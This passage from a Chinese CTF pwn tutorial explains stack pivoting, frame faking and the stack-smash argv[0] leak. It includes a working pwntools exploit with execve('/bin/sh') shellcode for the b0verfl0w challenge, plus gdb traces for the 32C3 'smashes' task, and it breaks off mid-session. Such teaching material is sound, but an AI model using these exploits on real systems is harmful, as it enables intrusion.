<p>可以看出，源程序存在栈溢出漏洞。但是其所能溢出的字节就只有50-0x20-4=14个字节，所以我们很难执行一些比较好的ROP。这里我们就考虑stack privot。由于程序本身并没有开启堆栈保护，所以我们可以在栈上布置shellcode并执行。基本利用思路如下</p>
<ul>
<li>利用栈溢出布置shellcode</li>
<li>控制eip指向shellcode处</li>
</ul>
<p>第一步，还是比较容易地，直接读取即可，但是由于程序本身会开启ASLR保护，所以我们很难直接知道shellcode的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对esp进行操作，使其指向shellcode处，并且直接控制程序跳转至esp处。那下面就是找控制程序跳转到esp处的gadgets了。</p>
<div class="codehilite"><pre><span></span>➜  X-CTF Quals <span class="m">2016</span> - b0verfl0w git:<span class="o">(</span>iromise<span class="o">)</span> ✗ ROPgadget --binary b0verfl0w --only <span class="s1">&#39;jmp|ret&#39;</span>         
Gadgets <span class="nv">information</span>
<span class="o">============================================================</span>
0x08048504 : jmp esp
0x0804836a : ret
0x0804847e : ret 0xeac1

Unique gadgets found: <span class="m">3</span>
</pre></div>

<p>这里我们发现有一个可以直接跳转到esp的gadgets。那么我们可以布置payload如下</p>
<div class="codehilite"><pre><span></span>shellcode|padding|fake ebp|0x08048504|set esp point to shellcode and jmp esp
</pre></div>

<p>那么我们payload中的最后一部分改如何设置esp呢，可以知道</p>
<ul>
<li>size(shellcode+padding)=0x20</li>
<li>size(fake ebp)=0x4</li>
<li>size(0x08048504)=0x4</li>
</ul>
<p>所以我们最后一段需要执行的指令就是</p>
<div class="codehilite"><pre><span></span><span class="nf">sub</span> <span class="mi">0x28</span><span class="p">,</span><span class="no">esp</span>
<span class="nf">jmp</span> <span class="no">esp</span>
</pre></div>

<p>所以最后的exp如下</p>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./b0verfl0w&#39;</span><span class="p">)</span>

<span class="n">shellcode_x86</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73</span><span class="s2">&quot;</span>
<span class="n">shellcode_x86</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0</span><span class="s2">&quot;</span>
<span class="n">shellcode_x86</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x0b\xcd\x80</span><span class="s2">&quot;</span>

<span class="n">sub_esp_jmp</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;sub esp, 0x28;jmp esp&#39;</span><span class="p">)</span>
<span class="n">jmp_esp</span> <span class="o">=</span> <span class="mh">0x08048504</span>
<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode_x86</span> <span class="o">+</span> <span class="p">(</span>
    <span class="mh">0x20</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode_x86</span><span class="p">))</span> <span class="o">*</span> <span class="s1">&#39;b&#39;</span> <span class="o">+</span> <span class="s1">&#39;bbbb&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">jmp_esp</span><span class="p">)</span> <span class="o">+</span> <span class="n">sub_esp_jmp</span>
<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>

<h4 id="2-">例2-转移堆<a class="headerlink" href="#2-" title="Permanent link">&para;</a></h4>
<p>待。</p>
<h3 id="_4">题目<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
<ul>
<li>EkoPartyCTF 2016 fuckzing-exploit-200</li>
</ul>
<h2 id="frame-faking">frame faking<a class="headerlink" href="#frame-faking" title="Permanent link">&para;</a></h2>
<p>正如这个技巧名字所说的那样，这个技巧就是构造一个虚假的栈帧来控制程序的执行流。</p>
<h3 id="_5">原理<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<p>概括地讲，我们在之前讲的栈溢出不外乎两种方式</p>
<ul>
<li>控制程序EIP</li>
<li>控制程序EBP</li>
</ul>
<p>其最终都是控制程序的执行流。在frame faking中，我们所利用的技巧便是同时控制EBP与EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。一般来说其payload如下</p>
<div class="codehilite"><pre><span></span>buffer padding|fake ebp|leave ret addr|
</pre></div>

<p>即我们利用栈溢出将栈上构造为如上格式。这里我们主要接下后面两个部分</p>
<ul>
<li>函数的返回地址被我们覆盖为执行leave ret的地址，这就表明了函数在正常执行完自己的leave ret后，还会再次执行一次leave ret。</li>
<li>其中fake ebp为我们构造的栈帧的基地址，需要注意的是这里是一个地址。一般来说我们构造的假的栈帧如下</li>
</ul>
<div class="codehilite"><pre><span></span>fake ebp
|
v
ebp2|target function addr|leave ret addr|arg1|arg2
</pre></div>

<p>这里我们的fake ebp指向ebp2，即它为ebp2所在的地址。通常来说，这里都是我们能够控制的可读的内容。</p>
<p><strong>下面的汇编语法是 AT&amp;T 语法。</strong></p>
<p>在我们介绍基本的控制过程之前，我们还是有必要说一下，函数的入口点与出口点的基本操作</p>
<p>入口点</p>
<div class="codehilite"><pre><span></span>push ebp  # 将ebp压栈
move esp, ebp #将esp的值赋给ebp
</pre></div>

<p>出口点</p>
<div class="codehilite"><pre><span></span>leave
ret #pop eip，弹出栈顶元素作为程序下一个执行地址
</pre></div>

<p>其中leave指令相当于</p>
<div class="codehilite"><pre><span></span>move ebp, esp # 将ebp的值赋给esp
pop ebp #弹出ebp
</pre></div>

<p>下面我们来仔细说一下基本的控制过程。</p>
<ol>
<li>
<p>在有栈溢出的程序执行leave时，其分为两个步骤</p>
</li>
<li>
<p>move ebp, esp ，这会将esp也指向当前栈溢出漏洞的ebp基地址处。</p>
</li>
<li>
<p>pop ebp， 这会将栈中存放的fake ebp的值赋给ebp。即执行完指令之后，ebp便指向了ebp2，也就是保存了ebp2所在的地址。</p>
</li>
<li>
<p>执行ret指令，会再次执行leave ret指令。</p>
</li>
<li>
<p>执行leave指令，其分为两个步骤</p>
</li>
<li>
<p>move ebp, esp ，这会将esp指向ebp2。</p>
</li>
<li>
<p>pop ebp，此时，会将ebp的内容设置为ebp2的值，同时esp会指向target function。</p>
</li>
<li>
<p>执行ret指令，这时候程序就会执行targetfunction，当其进行程序的时候会执行</p>
</li>
<li>
<p>push ebp,会将ebp2值压入栈中，</p>
</li>
<li>
<p>move esp, ebp，将ebp指向当前基地址。</p>
</li>
</ol>
<p>此时的栈结构如下</p>
<div class="codehilite"><pre><span></span>ebp
|
v
ebp2|leave ret addr|arg1|arg2
</pre></div>

<ol>
<li>
<p>当程序执行师，其会正常申请空间，同时我们在栈上也安排了该函数对应的参数，所以程序会正常执行。</p>
</li>
<li>
<p>程序结束后，其又会执行两次 leave ret addr，所以如果我们在ebp2处布置好了对应的内容，那么我们就可以一直控制程序的执行流程。</p>
</li>
</ol>
<p>可以看出在fake frame中，我们有一个需求就是，我们必须得有一块可以写的内存，并且我们还知道这块内存的地址，这一点与stack privot相似。</p>
<h3 id="_6">例子<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<p>目前来说，我在exploit-exercise的fusion level2中利用过这个技巧，其它地方暂时还未遇到，遇到的时候再进行补充。</p>
<h3 id="_7">题目<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<p>参考阅读</p>
<ul>
<li><a href="http://www.xfocus.net/articles/200602/851.html">http://www.xfocus.net/articles/200602/851.html</a></li>
<li><a href="http://phrack.org/issues/58/4.html">http://phrack.org/issues/58/4.html</a></li>
</ul>
<h2 id="stack-smash">Stack smash<a class="headerlink" href="#stack-smash" title="Permanent link">&para;</a></h2>
<h3 id="_8">原理<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
<p>在程序加了canary保护之后，如果我们读取的buffer覆盖了对应的值时，程序就会报错，而一般来说我们并不会关心报错信息。而stack smash技巧则就是利用打印这一信息的程序来得到我们想要的内容。这是因为在程序发现canary保护之后，如果发现canary被修改的话，程序就会执行__stack_chk_fail函数来打印argv[0]指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下</p>
<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">__stack_chk_fail</span> <span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
  <span class="n">__fortify_fail</span> <span class="p">(</span><span class="s">&quot;stack smashing detected&quot;</span><span class="p">);</span>
<span class="p">}</span>
<span class="kt">void</span> <span class="nf">__attribute__</span> <span class="p">((</span><span class="n">noreturn</span><span class="p">))</span> <span class="n">internal_function</span> <span class="n">__fortify_fail</span> <span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">msg</span><span class="p">)</span>
<span class="p">{</span>
  <span class="cm">/* The loop is added only to keep gcc happy.  */</span>
  <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">__libc_message</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">&quot;*** %s ***: %s terminated</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
                    <span class="n">msg</span><span class="p">,</span> <span class="n">__libc_argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">?:</span> <span class="s">&quot;&lt;unknown&gt;&quot;</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>

<p>所以说如果我们利用栈溢出覆盖argv[0]为我们想要输出的字符串的地址，那么在__fortify_fail函数中就会输出我们想要的信息。</p>
<h3 id="_9">例子<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<p>这里，我们以2015年32C3 CTF smashes为例进行介绍，该题目在jarvisoj上有复现。</p>
<h4 id="_10">确定保护<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h4>
<p>可以看出程序为64位，主要开启了Canary保护以及NX保护，以及FORTIFY保护。</p>
<div class="codehilite"><pre><span></span>➜  stacksmashes git:<span class="o">(</span>master<span class="o">)</span> ✗ checksec smashes
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    FORTIFY:  Enabled
</pre></div>

<h4 id="_11">分析程序<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h4>
<p>ida看一下</p>
<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="nf">sub_4007E0</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">v0</span><span class="p">;</span> <span class="c1">// rax@1</span>
  <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// rbx@2</span>
  <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// eax@3</span>
  <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [sp+0h] [bp-128h]@1</span>
  <span class="kr">__int64</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [sp+108h] [bp-20h]@1</span>

  <span class="n">v5</span> <span class="o">=</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mi">40LL</span><span class="p">);</span>
  <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="s">&quot;Hello!</span><span class="se">\n</span><span class="s">What&#39;s your name? &quot;</span><span class="p">);</span>
  <span class="n">LODWORD</span><span class="p">(</span><span class="n">v0</span><span class="p">)</span> <span class="o">=</span> <span class="n">_IO_gets</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">v4</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">v0</span> <span class="p">)</span>
<span class="nl">LABEL_9</span><span class="p">:</span>
    <span class="n">_exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">v1</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
  <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="s">&quot;Nice to meet you, %s.</span><span class="se">\n</span><span class="s">Please overwrite the flag: &quot;</span><span class="p">);</span>
  <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">v2</span> <span class="o">=</span> <span class="n">_IO_getc</span><span class="p">(</span><span class="n">stdin</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span> <span class="p">)</span>
      <span class="k">goto</span> <span class="n">LABEL_9</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v2</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="p">)</span>
      <span class="k">break</span><span class="p">;</span>
    <span class="n">byte_600D20</span><span class="p">[</span><span class="n">v1</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">v2</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span> <span class="n">v1</span> <span class="o">==</span> <span class="sc">&#39; &#39;</span> <span class="p">)</span>
      <span class="k">goto</span> <span class="n">LABEL_8</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mh">0x600D20LL</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v1</span><span class="p">));</span>
<span class="nl">LABEL_8</span><span class="p">:</span>
  <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Thank you, bye!&quot;</span><span class="p">);</span>
  <span class="k">return</span> <span class="o">*</span><span class="n">MK_FP</span><span class="p">(</span><span class="n">__FS__</span><span class="p">,</span> <span class="mi">40LL</span><span class="p">)</span> <span class="o">^</span> <span class="n">v5</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>很显然，程序在_IO_gets((__int64)&amp;v4);存在栈溢出。</p>
<p>此外，程序中还提示要overwrite flag。而且发现程序很有意思的在while循环之后执行了这条语句</p>
<div class="codehilite"><pre><span></span>  <span class="n">memset</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)((</span><span class="kt">signed</span> <span class="kt">int</span><span class="p">)</span><span class="n">v1</span> <span class="o">+</span> <span class="mh">0x600D20LL</span><span class="p">),</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)(</span><span class="mi">32</span> <span class="o">-</span> <span class="n">v1</span><span class="p">));</span>
</pre></div>

<p>又看了看对应地址的内容，可以发现如下内容，说明程序的flag就在这里啊。</p>
<div class="codehilite"><pre><span></span>.data:0000000000600D20 ; char aPctfHereSTheFl[]
.data:0000000000600D20 aPctfHereSTheFl db &#39;PCTF{Here&#39;,27h,&#39;s the flag on server}&#39;,0
</pre></div>

<p>但是如果我们直接利用栈溢出输出该地址的内容是不可行的，这是因为我们读入的内容<code>byte_600D20[v1++] = v2;</code>也恰恰就是该块内存，这会直接将其覆盖掉，这时候我们就需要利用一个技巧了</p>
<ul>
<li>在EFL内存映射时，bss段会被映射两次，所以我们可以使用另一处的地址来进行输出，可以使用gdb的find来进行查找。</li>
</ul>
<h4 id="flag">确定flag地址<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h4>
<p>我们把断点下载memset函数处，然后读取相应的内容如下</p>
<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">c</span>
<span class="nf">Continuing.</span>
<span class="nf">Hello</span><span class="p">!</span>
<span class="nf">What</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">your</span> <span class="no">name</span><span class="err">?</span> <span class="no">qqqqqqq</span>
<span class="nf">Nice</span> <span class="no">to</span> <span class="no">meet</span> <span class="no">you</span><span class="p">,</span> <span class="no">qqqqqqq.</span>
<span class="nf">Please</span> <span class="no">overwrite</span> <span class="no">the</span> <span class="no">flag</span><span class="p">:</span> <span class="mi">222222222</span>

<span class="nf">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="no">__memset_avx2</span> <span class="p">()</span> <span class="no">at</span> <span class="no">..</span><span class="err">/</span><span class="no">sysdeps</span><span class="err">/</span><span class="no">x86_64</span><span class="err">/</span><span class="no">multiarch</span><span class="err">/</span><span class="no">memset-avx2.S</span><span class="p">:</span><span class="mi">38</span>
<span class="err">38</span>  <span class="nf">..</span><span class="err">/</span><span class="no">sysdeps</span><span class="err">/</span><span class="no">x86_64</span><span class="err">/</span><span class="no">multiarch</span><span class="err">/</span><span class="no">memset-avx2.S</span><span class="p">:</span> <span class="err">没有那个文件或目录</span><span class="p">.</span>
<span class="err">─────────────────────────────────────[</span> <span class="nl">code:i386:</span><span class="nf">x86-64</span> <span class="p">]</span><span class="err">────</span>
   <span class="err">0</span><span class="nf">x7ffff7b7f920</span> <span class="err">&lt;</span><span class="no">__memset_chk_avx2</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">cmp</span>    <span class="no">rcx</span><span class="p">,</span> <span class="no">rdx</span>
   <span class="err">0</span><span class="nf">x7ffff7b7f923</span> <span class="err">&lt;</span><span class="no">__memset_chk_avx2</span><span class="err">+</span><span class="mi">3</span><span class="err">&gt;</span> <span class="no">jb</span>     <span class="mh">0x7ffff7b24110</span> <span class="p">&lt;</span><span class="no">__GI___chk_fail</span><span class="p">&gt;</span>
   <span class="err">0</span><span class="nf">x7ffff7b7f929</span>                  <span class="no">nop</span>    <span class="no">DWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rax</span><span class="err">+</span><span class="mi">0x0</span><span class="p">]</span>
 <span class="err">→</span> <span class="err">0</span><span class="nf">x7ffff7b7f930</span> <span class="err">&lt;</span><span class="no">__memset_avx2</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">vpxor</span>  <span class="no">xmm0</span><span class="p">,</span> <span class="no">xmm0</span><span class="p">,</span> <span class="no">xmm0</span>
   <span class="err">0</span><span class="nf">x7ffff7b7f934</span> <span class="err">&lt;</span><span class="no">__memset_avx2</span><span class="err">+</span><span class="mi">4</span><span class="err">&gt;</span> <span class="no">vmovd</span>  <span class="no">xmm1</span><span class="p">,</span> <span class="no">esi</span>
   <span class="err">0</span><span class="nf">x7ffff7b7f938</span> <span class="err">&lt;</span><span class="no">__memset_avx2</span><span class="err">+</span><span class="mi">8</span><span class="err">&gt;</span> <span class="no">lea</span>    <span class="no">rsi</span><span class="p">,</span> <span class="p">[</span><span class="no">rdi</span><span class="err">+</span><span class="no">rdx</span><span class="p">*</span><span class="mi">1</span><span class="p">]</span>
   <span class="err">0</span><span class="nf">x7ffff7b7f93c</span> <span class="err">&lt;</span><span class="no">__memset_avx2</span><span class="err">+</span><span class="mi">12</span><span class="err">&gt;</span> <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span> <span class="no">rdi</span>
<span class="err">───────────────────────────────────────────────────────────────────[</span> <span class="nf">stack</span> <span class="p">]</span><span class="err">────</span>
<span class="err">[&#39;0</span><span class="nf">x7fffffffda38</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>
<span class="err">8</span>
<span class="err">0</span><span class="nf">x00007fffffffda38</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x0000000000400878</span>  <span class="err">→</span>   <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="mi">0x40094e</span>  <span class="err">←</span> <span class="no">$rsp</span>
<span class="err">0</span><span class="nf">x00007fffffffda40</span><span class="err">│+</span><span class="mi">0x08</span><span class="p">:</span> <span class="mi">0x0071717171717171</span> <span class="p">(</span><span class="err">&quot;</span><span class="no">qqqqqqq</span><span class="err">&quot;?</span><span class="p">)</span>
<span class="err">0</span><span class="nf">x00007fffffffda48</span><span class="err">│+</span><span class="mi">0x10</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffda50</span><span class="err">│+</span><span class="mi">0x18</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffda58</span><span class="err">│+</span><span class="mi">0x20</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffda60</span><span class="err">│+</span><span class="mi">0x28</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffda68</span><span class="err">│+</span><span class="mi">0x30</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">0</span><span class="nf">x00007fffffffda70</span><span class="err">│+</span><span class="mi">0x38</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
<span class="err">──────────────────────────────────────────────────────────────────────────────[</span> <span class="nf">trace</span> <span class="p">]</span><span class="err">────</span>
<span class="err">[</span><span class="c">#0] 0x7ffff7b7f930 → Name: __memset_avx2()</span>
<span class="err">[</span><span class="c">#1] 0x400878 → mov edi, 0x40094e</span>
<span class="err">──────────────────────────────────────────────────────────────────────────────</span>
<span class="nf">gef</span><span class="err">➤</span>  <span class="no">find</span> <span class="mi">22222</span>
<span class="nf">Argument</span> <span class="no">required</span> <span class="p">(</span><span class="no">expression</span> <span class="no">to</span> <span class="no">compute</span><span class="p">).</span>
<span class="nf">gef</span><span class="err">➤</span>  <span class="no">find</span> <span class="err">&#39;</span><span class="mi">22222</span><span class="err">&#39;</span>
<span class="nf">No</span> <span class="no">symbol</span> <span class="err">&quot;</span><span class="mi">22222</span><span class="err">&quot;</span> <span class="no">in</span> <span class="no">current</span> <span class="no">context.</span>
<span class="nf">gef</span><span class="err">➤</span>  <span class="no">grep</span> <span class="err">&#39;</span><span class="mi">22222</span><span class="err">&#39;</span>
<span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="mi">22222</span><span class="err">&#39;</span> <span class="no">in</span> <span class="no">memory</span>
<span class="err">[+]</span> <span class="nf">In</span> <span class="err">&#39;/</span><span class="no">mnt</span><span class="err">/</span><span class="no">hgfs</span><span class="err">/</span><span class="no">Hack</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">ctf-wiki</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">stackoverflow</span><span class="err">/</span><span class="no">example</span><span class="err">/</span><span class="no">stacksmashes</span><span class="err">/</span><span class="no">smashes</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x600000</span><span class="p">-</span><span class="mi">0x601000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rw-</span>
  <span class="err">0</span><span class="nf">x600d20</span> <span class="p">-</span> <span class="mi">0x600d3f</span>  <span class="err">→</span>   <span class="err">&quot;</span><span class="mi">222222222</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">the</span> <span class="no">flag</span> <span class="no">on</span> <span class="no">server</span><span class="err">}&quot;</span> 
<span class="p">[</span><span class="err">+</span><span class="p">]</span> <span class="no">In</span> <span class="err">&#39;</span><span class="p">[</span><span class="no">heap</span><span class="p">]</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x601000</span><span class="p">-</span><span class="mi">0x622000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">rw-</span>
  <span class="err">0</span><span class="nf">x601010</span> <span class="p">-</span> <span class="mi">0x601019</span>  <span class="err">→</span>   <span class="err">&quot;</span><span class="mi">222222222</span><span class="err">&quot;</span> 
<span class="no">gef</span><span class="err">➤</span>  <span class="no">grep</span> <span class="no">PCTF</span>
<span class="err">[+]</span> <span class="nf">Searching</span> <span class="err">&#39;</span><span class="no">PCTF</span><span class="err">&#39;</span> <span class="no">in</span> <span class="no">memory</span>
<span class="err">[+]</span> <span class="nf">In</span> <span class="err">&#39;/</span><span class="no">mnt</span><span class="err">/</span><span class="no">hgfs</span><span class="err">/</span><span class="no">Hack</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">ctf-wiki</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">stackoverflow</span><span class="err">/</span><span class="no">example</span><span class="err">/</span><span class="no">stacksmashes</span><span class="err">/</span><span class="no">smashes</span><span class="err">&#39;</span><span class="p">(</span><span class="mi">0x400000</span><span class="p">-</span><span class="mi">0x401000</span><span class="p">),</span> <span class="no">permission</span><span class="err">=</span><span class="no">r-x</span>
  <span class="err">0</span><span class="nf">x400d20</span> <span class="p">-</span> <span class="mi">0x400d3f</span>  <span class="err">→</span>   <span class="err">&quot;</span><span class="no">PCTF</span><span class="err">{</span><span class="no">Here</span><span class="err">&#39;</span><span class="no">s</span> <span class="no">the</span> <span class="no">flag</span> <span class="no">on</span> <span class="no">server</span><span class="err">}&quot;</span> 
</pre></div>

<p>可以看出我们读入的2222已经覆盖了0x600d20处的flag，但是我们在内存的0x400d20处仍然找到了这个flag的备份，所以我们还是可以将其输出。这里我们已经确定了flag的地址。</p>
<h4 id="_12">确定偏移<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h4>
<p>下面，我们确定argv[0]距离读取的字符串的偏移。</p>
<p>首先下断点在main函数入口处，如下</p>
<div class="codehilite"><pre><span></span><span class="nf">gef</span><span class="err">➤</span>  <span class="no">b</span> <span class="p">*</span><span class="mi">0x00000000004006D0</span>
<span class="nf">Breakpoint</span> <span class="mi">1</span> <span class="no">at</span> <span class="mi">0x4006d0</span>
<span class="nf">gef</span><span class="err">➤</span>  <span class="no">r</span>
<span class="nf">Starting</span> <span class="no">program</span><span class="p">:</span> <span class="err">/</span><span class="no">mnt</span><span class="err">/</span><span class="no">hgfs</span><span class="err">/</span><span class="no">Hack</span><span class="err">/</span><span class="no">ctf</span><span class="err">/</span><span class="no">ctf-wiki</span><span class="err">/</span><span class="no">pwn</span><span class="err">/</span><span class="no">stackoverflow</span><span class="err">/</span><span class="no">example</span><span class="err">/</span><span class="no">stacksmashes</span><span class="err">/</span><span class="no">smashes</span> 

<span class="no">Breakpoint</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0x00000000004006d0</span> <span class="no">in</span> <span class="err">??</span> <span class="p">()</span>
 <span class="nl">code:i386:</span><span class="nf">x86-64</span> <span class="p">]</span><span class="err">────</span>
     <span class="err">0</span><span class="nf">x4006c0</span> <span class="err">&lt;</span><span class="no">_IO_gets@plt</span><span class="err">+</span><span class="mi">0</span><span class="err">&gt;</span> <span class="no">jmp</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x20062a</span><span class="p">]</span>        <span class="c"># 0x600cf0 &lt;_IO_gets@got.plt&gt;</span>
     <span class="mh">0x4006c6</span> <span class="p">&lt;</span><span class="no">_IO_gets@plt</span><span class="p">+</span><span class="mi">6</span><span class="p">&gt;</span> <span class="no">push</span>   <span class="mi">0x9</span>
     <span class="err">0</span><span class="nf">x4006cb</span> <span class="err">&lt;</span><span class="no">_IO_gets@plt</span><span class="err">+</span><span class="mi">11</span><span class="err">&gt;</span> <span class="no">jmp</span>    <span class="mi">0x400620</span>
 <span class="err">→</span>   <span class="err">0</span><span class="nf">x4006d0</span>                  <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span> <span class="mi">0x8</span>
     <span class="err">0</span><span class="nf">x4006d4</span>                  <span class="no">mov</span>    <span class="no">rdi</span><span class="p">,</span> <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x200665</span><span class="p">]</span>        <span class="c"># 0x600d40 &lt;stdout&gt;</span>
     <span class="mi">0x4006db</span>                  <span class="no">xor</span>    <span class="no">esi</span><span class="p">,</span> <span class="no">esi</span>
     <span class="err">0</span><span class="nf">x4006dd</span>                  <span class="no">call</span>   <span class="mh">0x400660</span> <span class="p">&lt;</span><span class="no">setbuf@plt</span><span class="p">&gt;</span>
<span class="err">──────────────────────────────────────────────────────────────────[</span> <span class="nf">stack</span> <span class="p">]</span><span class="err">────</span>
<span class="err">[&#39;0</span><span class="nf">x7fffffffdb78</span><span class="err">&#39;</span><span class="p">,</span> <span class="err">&#39;</span><span class="no">l8</span><span class="err">&#39;</span><span class="p">]</span>
<span class="err">8</span>
<span class="err">0</span><span class="nf">x00007fffffffdb78</span><span class="err">│+</span><span class="mi">0x00</span><span class="p">:</span> <span class="mi">0x00007ffff7a2d830</span>  <span class="err">→</span>  <span class="err">&lt;</span><span class="no">__libc_start_main</span><span class="err">+</span><span class="mi">240</span><span class="err">&gt;</span> <span class="no">mov</span> <span class="no">edi</span><span class="p">,</span> <span class="no">eax</span>    <span class="err">←</span> <span class="no">$rsp</span>
<span class="err">0</span><span class="nf">x00007fffffffdb80</span><span class="err">│+</span><span class="mi">0x08</span><span class="p">:</span> <span class="mi">0x0000000000000000</span>
